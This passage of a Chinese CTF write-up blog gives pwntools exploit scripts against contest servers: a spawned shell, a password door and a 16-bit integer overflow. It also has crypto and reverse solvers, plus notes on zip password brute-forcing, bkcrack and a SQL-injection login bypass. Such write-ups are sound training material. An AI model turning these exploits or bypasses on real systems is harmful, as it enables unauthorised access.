class="line">    # 确保 shell 有时间启动，然后发送命令</span><br><span class="line">    time.sleep(0.3) </span><br><span class="line">    </span><br><span class="line">    # 发送 shell 命令</span><br><span class="line">    io.sendline(b&#x27;sh&#x27;)</span><br><span class="line">    io.sendline(b&#x27;cat flag&#x27;) </span><br><span class="line">    </span><br><span class="line">    # 尝试接收所有剩余的数据</span><br><span class="line">    try:</span><br><span class="line">        flag_data = io.recvall(timeout=3) </span><br><span class="line">        if flag_data and b&#x27;flag&#123;&#x27; in flag_data:</span><br><span class="line">            log.success(&quot; FLAG FOUND! &quot;)</span><br><span class="line">            print(flag_data.decode(errors=&#x27;ignore&#x27;)) </span><br><span class="line">        elif b&#x27;Congratulations&#x27; in flag_data:</span><br><span class="line">            log.success(&quot; Shell confirmed! Check output for flag.&quot;)</span><br><span class="line">            print(flag_data.decode(errors=&#x27;ignore&#x27;))</span><br><span class="line">        else:</span><br><span class="line">            log.warning(&quot;Received data but no clear flag. Switching to interactive mode.&quot;)</span><br><span class="line">            io.interactive() # 切换到手动模式以防万一</span><br><span class="line">            </span><br><span class="line">    except Exception as e:</span><br><span class="line">        log.error(f&quot;Error during final data capture: &#123;e&#125;&quot;)</span><br><span class="line">        io.interactive()</span><br><span class="line"></span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="16.png" alt="16"></p>
<h3 id="pwn’s-door"><a href="#pwn’s-door" class="headerlink" title="pwn’s door"></a>pwn’s door</h3><p>分析源码后发现输入对应密码后cat &#x2F;flag即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 替换为实际的 IP 和 Port</span><br><span class="line">HOST = &#x27;47.94.87.199&#x27; </span><br><span class="line">PORT = 28674</span><br><span class="line">PASSWORD = b&#x27;7038329&#x27; # 将密码转换为字节串</span><br><span class="line"></span><br><span class="line">log.info(f&quot;Connecting to &#123;HOST&#125;:&#123;PORT&#125;&quot;)</span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"># 接收直到 &#x27;password: &#x27; 的提示信息</span><br><span class="line">io.recvuntil(b&#x27;password: &#x27;)</span><br><span class="line"></span><br><span class="line">log.success(f&quot;Sending password: &#123;PASSWORD.decode()&#125;&quot;)</span><br><span class="line"># 发送密码和换行符</span><br><span class="line">io.sendline(PASSWORD)</span><br><span class="line"></span><br><span class="line"># 此时程序应该进入 shell</span><br><span class="line">log.info(&quot;Successfully opened the door! Sending &#x27;cat flag&#x27; command.&quot;)</span><br><span class="line">io.sendline(b&#x27;cat flag&#x27;)</span><br><span class="line"></span><br><span class="line"># 切换到交互模式以查看 flag 并保持会话</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="15.png" alt="15"></p>
<h3 id="INTbug"><a href="#INTbug" class="headerlink" title="INTbug"></a>INTbug</h3><p>通过整数溢出漏洞来获取 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 远程目标地址和端口</span><br><span class="line">HOST = &#x27;39.106.48.123&#x27;</span><br><span class="line">PORT = 26282</span><br><span class="line"># 触发 16 位有符号整数溢出所需的循环次数 (32767 + 1)</span><br><span class="line">OVERFLOW_COUNT = 32768 </span><br><span class="line"></span><br><span class="line"># 设置日志级别，减少不必要的输出</span><br><span class="line">context.log_level = &#x27;info&#x27; </span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    print(f&quot;[*] Connecting to &#123;HOST&#125;:&#123;PORT&#125;&quot;)</span><br><span class="line">    try:</span><br><span class="line">        # 建立远程连接</span><br><span class="line">        io = remote(HOST, PORT)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        log.error(f&quot;Failed to connect: &#123;e&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    log.info(f&quot;Starting &#123;OVERFLOW_COUNT&#125; loops to trigger __int16 overflow...&quot;)</span><br><span class="line"></span><br><span class="line">    # 循环发送正数</span><br><span class="line">    for i in range(OVERFLOW_COUNT):</span><br><span class="line">        # scanf(&quot;%d&quot;, &amp;v2) 期望接收一个整数和换行符。发送 &#x27;1\n&#x27;。</span><br><span class="line">        # 使用 str(1).encode() + b&#x27;\n&#x27; 等效于 p32(1) 或 p64(1) 对于 int v2 来说，</span><br><span class="line">        # 但 scanf(&quot;%d&quot;) 是读取 ASCII 文本，所以发送 b&#x27;1&#x27; 即可。</span><br><span class="line">        io.sendline(b&#x27;1&#x27;)</span><br><span class="line">        </span><br><span class="line">        # 每 1000 次循环打印一次进度</span><br><span class="line">        if (i + 1) % 1000 == 0:</span><br><span class="line">            log.progress(&quot;Progress&quot;, f&quot;&#123;i + 1&#125;/&#123;OVERFLOW_COUNT&#125; inputs sent&quot;)</span><br><span class="line"></span><br><span class="line">    log.success(&quot;All inputs sent. Waiting for the flag...&quot;)</span><br><span class="line"></span><br><span class="line">    # 循环结束后，程序会打印 flag，使用 interactive() 模式接收剩余的所有数据</span><br><span class="line">    # 这会让我们进入程序交互模式，直到程序终止</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="13.png" alt="13"></p>
<h3 id="gdb-challenge"><a href="#gdb-challenge" class="headerlink" title="gdb_challenge"></a>gdb_challenge</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="12.png" alt="12"><br>作者一上来就是很暖心的新手村教程啊 点赞</p>
<p>按流程走一遍就行了 就是希望下次能加个存档功能 失败&#x2F;调窗口&#x2F;误触ctrl+c 就得重来<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="14.png" alt="14"></p>
<h2 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="plzdebugme"><a href="#plzdebugme" class="headerlink" title="plzdebugme"></a>plzdebugme</h3><p>通过debugger&#x2F;设置断点的方式获取flag</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="9.png" alt="9"></p>
<h3 id="EzMyDroid"><a href="#EzMyDroid" class="headerlink" title="EzMyDroid"></a>EzMyDroid</h3><p>jadx-gui中导出源代码 发现页面中对应输入框-比对flag的具体函数 并组建逆向运行的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 密文</span><br><span class="line">cipher_text_b64 = &quot;cTz2pDhl8fRMfkkJXfqs2t8JBsqLkvQZDLYpWjEtkLE=&quot;</span><br><span class="line">cipher_bytes = base64.b64decode(cipher_text_b64)</span><br><span class="line"></span><br><span class="line"># 密钥</span><br><span class="line">key = b&quot;1145141919810000&quot;</span><br><span class="line"></span><br><span class="line"># AES-ECB 解密</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plain_bytes = cipher.decrypt(cipher_bytes)</span><br><span class="line"></span><br><span class="line"># 去掉 PKCS7 填充</span><br><span class="line">pad_len = plain_bytes[-1]</span><br><span class="line">plain_text = plain_bytes[:-pad_len].decode()</span><br><span class="line"></span><br><span class="line">print(&quot;解密结果:&quot;, plain_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h3><p>按照游戏内容寻找四份flag碎片 最后合一起提交就行<br>1和2都在函数名&#x2F;函数中 3进行了些许加密 4也是直接放出了<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="38fdaf1d16a67e73317d6dc3298dd7bf.png" alt="38fdaf1d16a67e73317d6dc3298dd7bf"></p>
<h3 id="x0r"><a href="#x0r" class="headerlink" title="x0r"></a>x0r</h3><p>就是异或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 目标字符串，是程序里最终比较的 Str2</span><br><span class="line">target = &quot;anu`ym7wKLl$P]v3q%D]lHpi&quot;</span><br><span class="line"></span><br><span class="line"># XOR key 对应 C 程序里的两轮 XOR</span><br><span class="line">first_xor = [0x14, 0x11, 0x45]  # 第一次循环使用的 key</span><br><span class="line">second_xor = [0x13, 0x13, 0x51]  # 第二次循环使用的 key (v5=19=0x13, v6=19=0x13, v7=81=0x51)</span><br><span class="line"></span><br><span class="line"># 用于存储反算出的 flag</span><br><span class="line">original_flag = []</span><br><span class="line"></span><br><span class="line">for i, ch in enumerate(target):</span><br><span class="line">    # 将目标字符转换为 ASCII</span><br><span class="line">    c = ord(ch)</span><br><span class="line">    </span><br><span class="line">    # C 程序的逻辑是：</span><br><span class="line">    # 第一次 XOR -&gt; 第二次 XOR -&gt; 最终得到 target</span><br><span class="line">    # 反算过程就是：target ^ second_xor ^ first_xor</span><br><span class="line">    orig = c ^ second_xor[i % 3] ^ first_xor[i % 3]</span><br><span class="line">    </span><br><span class="line">    # 保存反算得到的字符</span><br><span class="line">    original_flag.append(chr(orig))</span><br><span class="line"></span><br><span class="line"># 拼接得到 flag 字符串</span><br><span class="line">flag = &quot;&quot;.join(original_flag)</span><br><span class="line"></span><br><span class="line">print(&quot;Recovered flag (length &#123;&#125;):&quot;.format(len(flag)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>



<h3 id="Strange-Base"><a href="#Strange-Base" class="headerlink" title="Strange Base"></a>Strange Base</h3><p>该题使用了自定义base64加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># decode_custom_b64_oneoff.py</span><br><span class="line">TABLE_STR = &quot;HElLo!A=CrQzy-B4S3|is&#x27;waITt1ng&amp;Y0u^&#123;/(&gt;v&lt;)*&#125;GO~256789pPqWXVKJNMF&quot;</span><br><span class="line">CIPHER = &quot;T&gt;6uTqOatL39aP!YIqruyv(YBA!8y7ouCa9=&quot;</span><br><span class="line"></span><br><span class="line">rev = &#123;TABLE_STR[i]: i for i in range(64)&#125;</span><br><span class="line">cipher = CIPHER.rstrip(&#x27;=&#x27;)</span><br><span class="line">bits = &#x27;&#x27;.join(f&quot;&#123;rev[ch]:06b&#125;&quot; for ch in cipher)</span><br><span class="line">data = bytes(int(bits[i:i+8],2) for i in range(0, len(bits)//8*8, 8))</span><br><span class="line">print(data.decode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Crypto-4"><a href="#Crypto-4" class="headerlink" title="Crypto"></a>Crypto</h2><p>不太会 这部分尽量只展示用到的代码 原理就不讲了</p>
<h3 id="Sagemath使用指哪？"><a href="#Sagemath使用指哪？" class="headerlink" title="Sagemath使用指哪？"></a>Sagemath使用指哪？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key=1</span><br><span class="line">G = PSL(2, 11); key*=G.order()</span><br><span class="line">G = CyclicPermutationGroup(11); key*=G.order()</span><br><span class="line">G = AlternatingGroup(114); key*=G.order()</span><br><span class="line">G = PSL(4, 7); key*=G.order()</span><br><span class="line">G = PSU(3, 4); key*=G.order()</span><br><span class="line">G = MathieuGroup(12); key*=G.order()</span><br><span class="line"></span><br><span class="line">c=91550542840025722520458836108112308924742424464072171170891749838108012046397534151231852770095499011</span><br><span class="line"></span><br><span class="line">key = int(str(bin(key))[2:][0:42*8], 2)</span><br><span class="line">m = c ^^ key</span><br><span class="line"></span><br><span class="line">f=[]</span><br><span class="line">while m&gt;0:</span><br><span class="line">    f.append(chr(m % 256))</span><br><span class="line">    m//=256</span><br><span class="line">f.reverse()</span><br><span class="line">flag = &#x27;&#x27;.join(f)</span><br><span class="line">print(flag)</span><br><span class="line"># 放进sage终端即可</span><br></pre></td></tr></table></figure>

<h3 id="随机数之旅1"><a href="#随机数之旅1" class="headerlink" title="随机数之旅1"></a>随机数之旅1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from math import isqrt</span><br><span class="line"></span><br><span class="line">a = 295789025762601408173828135835543120874436321839537374211067344874253837225114998888279895650663245853</span><br><span class="line">p = 516429062949786265253932153679325182722096129240841519231893318711291039781759818315309383807387756431</span><br><span class="line">h = [184903644789477348923205958932800932778350668414212847594553173870661019334816268921010695722276438808,</span><br><span class="line">     289189387531555679675902459817169546843094450548753333994152067745494929208355954578346190342131249104]</span><br><span class="line"></span><br><span class="line">m = (h[1] - a * h[0]) % p</span><br><span class="line">m_len = (m.bit_length() + 7) // 8</span><br><span class="line">flag = m.to_bytes(m_len, &#x27;big&#x27;)</span><br><span class="line">print(flag.decode())</span><br></pre></td></tr></table></figure>

<h3 id="初识rsa"><a href="#初识rsa" class="headerlink" title="初识rsa"></a>初识rsa</h3><p>MD5 能用线上查表 反查到原文<br>5ae9b7f211e23aac3df5f2b8f3b8eada 明文是 “crypto”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># decrypt_flag.py</span><br><span class="line">from math import gcd, isqrt</span><br><span class="line"></span><br><span class="line">P = 8950704257708450266553505566662195919814660677796969745141332884563215887576312397012443714881729945084204600427983533462340628158820681332200645787691506</span><br><span class="line">n = 44446616188218819786207128669544260200786245231084315865332960254466674511396013452706960167237712984131574242297631824608996400521594802041774252109118569706894250996931000927100268277762882754652796291883967540656284636140320080424646971672065901724016868601110447608443973020392152580956168514740954659431174557221037876268055284535861917524270777789465109449562493757855709667594266126482042307573551713967456278514060120085808631486752297737122542989222157016105822237703651230721732928806660755347805734140734412060262304703945060273095463889784812104712104670060859740991896998661852639384506489736605859678660859641869193937584995837021541846286340552602342167842171089327681673432201518271389316638905030292484631032669474635442148203414558029464840768382970333</span><br><span class="line">c = 42481263623445394280231262620086584153533063717448365833463226221868120488285951050193025217363839722803025158955005926008972866584222969940058732766011030882489151801438753030989861560817833544742490630377584951708209970467576914455924941590147893518967800282895563353672016111485919944929116082425633214088603366618022110688943219824625736102047862782981661923567377952054731667935736545461204871636455479900964960932386422126739648242748169170002728992333044486415920542098358305720024908051943748019208098026882781236570466259348897847759538822450491169806820787193008018522291685488876743242619977085369161240842263956004215038707275256809199564441801377497312252051117441861760886176100719291068180295195677144938101948329274751595514805340601788344134469750781845</span><br><span class="line"># --------------------------------------------------</span><br><span class="line"></span><br><span class="line">key = b&quot;crypto&quot;</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">def bytes_to_long(b: bytes) -&gt; int:</span><br><span class="line">    return int.from_bytes(b, byteorder=&#x27;big&#x27;)</span><br><span class="line"></span><br><span class="line">k = bytes_to_long(key)</span><br><span class="line">p = P ^ k</span><br><span class="line"></span><br><span class="line">assert p &gt; 1 and n % (p**3) == 0, &quot;p 恢复失败或 key 错误&quot;</span><br><span class="line"></span><br><span class="line">rem = n // (p**3)</span><br><span class="line">q = isqrt(rem)</span><br><span class="line">assert q * q == rem, &quot;q 恢复失败&quot;</span><br><span class="line"></span><br><span class="line"># lambda(n) = lcm(p^2*(p-1), q*(q-1))</span><br><span class="line">a = p**2 * (p - 1)</span><br><span class="line">b = q * (q - 1)</span><br><span class="line">lam = a // gcd(a, b) * b</span><br><span class="line"></span><br><span class="line">d = pow(e, -1, lam)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">m_len = (m.bit_length() + 7) // 8</span><br><span class="line">flag = m.to_bytes(m_len, &#x27;big&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;key:&quot;, key)</span><br><span class="line">print(&quot;flag:&quot;, flag.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="小跳蛙"><a href="#小跳蛙" class="headerlink" title="小跳蛙"></a>小跳蛙</h3><p>这个要登进服务器和人玩游戏 5次就能成功获取flag</p>
<p>规则是：</p>
<ol>
<li>如果 <code>a &gt; b</code>，青蛙跳到 <code>(a-b, b)</code></li>
<li>如果 <code>a &lt; b</code>，青蛙跳到 <code>(a, b-a)</code></li>
<li>如果 <code>a = b</code>，青蛙停下</li>
</ol>
<p>重复执行这个操作，直到青蛙停止为止。<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="5b7e50a33db4e76a82674ca53bbf9e7f.png" alt="5b7e50a33db4e76a82674ca53bbf9e7f"></p>
<h3 id="唯一表示"><a href="#唯一表示" class="headerlink" title="唯一表示"></a>唯一表示</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory.modular import crt</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from sympy import primerange</span><br><span class="line"></span><br><span class="line"># ----------------- 输入数据 -----------------</span><br><span class="line"></span><br><span class="line"># 1. 余数列表 c</span><br><span class="line">c_list = [1, 2, 2, 4, 0, 2, 11, 11, 8, 23, 1, 30, 35, 0, 18, 30, 55, 60, 29, 42, 8, 13, 49, 11, 69, 26, 8, 73, 84, 67, 100, 9, 77, 72, 127, 49, 57, 74, 70, 129, 146, 45, 35, 180, 196, 101, 100, 146, 100, 194, 2, 161, 35, 155]</span><br><span class="line"></span><br><span class="line"># 2. 模数列表 M</span><br><span class="line"># 根据原始逻辑，模数是前 len(c_list) 个素数</span><br><span class="line">num_primes = len(c_list)</span><br><span class="line">all_primes = list(primerange(2, 114514))</span><br><span class="line">M = all_primes[:num_primes]</span><br><span class="line"></span><br><span class="line"># ----------------- 恢复逻辑 -----------------</span><br><span class="line"></span><br><span class="line"># 使用 CRT 恢复原始整数</span><br><span class="line"># crt(moduli, remainders) 返回 (reconstructed_int, total_modulus)</span><br><span class="line">print(&quot;--- 正在执行 CRT 逆运算... ---&quot;)</span><br><span class="line">message_int, _ = crt(M, c_list)</span><br><span class="line"></span><br><span class="line"># 将整数转换回 bytes</span><br><span class="line">flag_bytes = long_to_bytes(message_int)</span><br><span class="line"></span><br><span class="line"># 解码为字符串</span><br><span class="line">flag = flag_bytes.decode()</span><br><span class="line"></span><br><span class="line"># ----------------- 输出结果 -----------------</span><br><span class="line"></span><br><span class="line">print(f&quot;恢复出的整数 (message_int): &#123;message_int&#125;&quot;)</span><br><span class="line">print(f&quot;解码后的 Flag: &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure>


<h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc-我不要革命失败"><a href="#Misc-我不要革命失败" class="headerlink" title="[Misc]我不要革命失败"></a>[Misc]我不要革命失败</h3><p>获取dmp文件 得知flag格式为flag{崩溃类型(即蓝屏显示的终止代码)_故障进程}<br>拖到windbg里分析一下就行</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="5.png" alt="5"><br>flag{CRITICAL_PROCESS_DIED_svchost.exe}</p>
<h3 id="MISC城邦-压缩术"><a href="#MISC城邦-压缩术" class="headerlink" title="MISC城邦-压缩术"></a>MISC城邦-压缩术</h3><p>获取一个zip文件 密码暗示下来是小写字母+0-9数字的组合 爆破即可<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="ab465dae6b5efc63a8ece021f49d2d20.png" alt="ab465dae6b5efc63a8ece021f49d2d20"></p>
<p>第二层还有加密 要使用bkcrack 直接解压出其中的flag.zip 随后利用其中未加密的key.txt结合 爆出未加密的flag.zip<br>最终得出flag<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="d93f2ebc7a76ea640b37a64a3f5a7ab2.png" alt="d93f2ebc7a76ea640b37a64a3f5a7ab2"></p>
<h3 id="EZ-fence"><a href="#EZ-fence" class="headerlink" title="EZ_fence"></a>EZ_fence</h3><p>给了张图片 图片内容为一段代码 中间有个等号<br>按照题干内容fence（栅栏密码）和4颗钉子（间隔为4）得出base64码密文<br>随后查看图片隐写 检查十六进制代码后发现该图片同时是个zip文件 但需要密码<br>通过代码更改图片大小后发现下半部分隐藏了base64隐写的自定义密轮<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="8cd03308d1d5a093fb1f1b0b5053a7d1.png" alt="8cd03308d1d5a093fb1f1b0b5053a7d1"><br>通过网站解密后可发现压缩包的密码 从而得到flag<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="e83e0f3efc8200fd825a9cd947db29f2.png" alt="e83e0f3efc8200fd825a9cd947db29f2"></p>
<h3 id="前有文字，所以搜索很有用"><a href="#前有文字，所以搜索很有用" class="headerlink" title="前有文字，所以搜索很有用"></a>前有文字，所以搜索很有用</h3><p>track1 对应零宽字符加密 和base64加密<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="4d6b0653ab3244a3979a58aaa4c558a9.png" alt="4d6b0653ab3244a3979a58aaa4c558a9"></p>
<p>track2 对应snow加密 brainfuck加密和摩斯密码<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="7e3a41c3faf936f45deb46bdcc3f4d79.png" alt="7e3a41c3faf936f45deb46bdcc3f4d79"></p>
<p>track3 对应字数统计<br>三段合一起获得flag</p>
<h3 id="OSINT-天空belong"><a href="#OSINT-天空belong" class="headerlink" title="OSINT-天空belong"></a>OSINT-天空belong</h3><p>根据机翼上的编号B-7198和边缘的紫色判断出这是乌鲁木齐航空的一架波音<br>照片信息显示是小米拍的 日期2025&#x2F;8&#x2F;17 15:03<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="9fad473532dece3a78e4e1bbf9dbfeb2.png" alt="9fad473532dece3a78e4e1bbf9dbfeb2"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="82d9d13e17bb00fc198c661472ed5180.png" alt="9fad473532dece3a78e4e1bbf9dbfeb2"><br>航班UQ3573搜到之后15:15该航班在长沙稍作停留 那地点就是稍微前面一点的武汉<br>得出flag</p>
<h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web"></a>Web</h2><h3 id="别笑，你也过不了第二关"><a href="#别笑，你也过不了第二关" class="headerlink" title="别笑，你也过不了第二关"></a>别笑，你也过不了第二关</h3><p>java代码直接内置在了html中 并且外露 分析代码后用F12-console修改得分即可通关</p>
<h3 id="multi-headach3"><a href="#multi-headach3" class="headerlink" title="multi-headach3"></a>multi-headach3</h3><p>高亮提示robots（对应robots.txt）指向某个页面 和head （查看指向页面后302的header获取flag）<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="1.png" alt="1"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2.png" alt="2"></p>
<h3 id="strange-login"><a href="#strange-login" class="headerlink" title="strange_login"></a>strange_login</h3><p>使用用户名admin以及sql万能密码即可登录</p>
